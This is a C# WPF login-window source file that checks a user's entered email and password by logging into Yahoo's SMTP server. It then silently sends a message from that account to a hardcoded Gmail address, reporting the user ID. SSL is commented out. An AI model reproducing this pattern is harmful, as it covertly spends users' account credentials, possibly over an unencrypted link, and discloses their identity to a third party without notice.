using System;
using System.Collections.Generic;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using System.Web;
using System.Net.Mail;
using System.Net;
using StockD;


namespace ShubhaRt
{
    /// <summary>
    /// Interaction logic for Login.xaml
    /// </summary>
    public partial class Login : Window
    {
        public Login()
        {
            InitializeComponent();
        }

        private void frame1_Navigated(object sender, System.Windows.Navigation.NavigationEventArgs e)
        {
            //Login Page








        }

        private void Login_btn_Click(object sender, RoutedEventArgs e)
        {
            if(username.Text=="")
            {
                System.Windows.MessageBox.Show("Please Enter User Name");
                return;
            }
            if (password .Text == "")
            {
                System.Windows.MessageBox.Show("Please Enter Password");
                return;
            }

            try
            {
                string subject = username.Text;
                string body = "Register User Id:----" + subject + "\n ";
                var smtp = new SmtpClient
                {
                    Host = "smtp.mail.yahoo.com",
                    Port = 587,
                    //EnableSsl = false ,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    //UseDefaultCredentials = false ,
                    Credentials = new NetworkCredential(username.Text, password.Text)
                };
                using (var message = new MailMessage(username.Text, "shanteshpaigude1988@gmail.com")
                {
                    Subject = subject,
                    Body = body
                })
                {
                    smtp.Send(message);
                }
            }

            catch
            {
                System.Windows.MessageBox.Show("Please Enter Valid User Name And Password");
            }
        }

        private void Cancle_btn_Click(object sender, RoutedEventArgs e)
        {



            Login l = new Login();
            l.Close();
            MainWindow a = new MainWindow();
            a.Show();
           
        }
    }
}
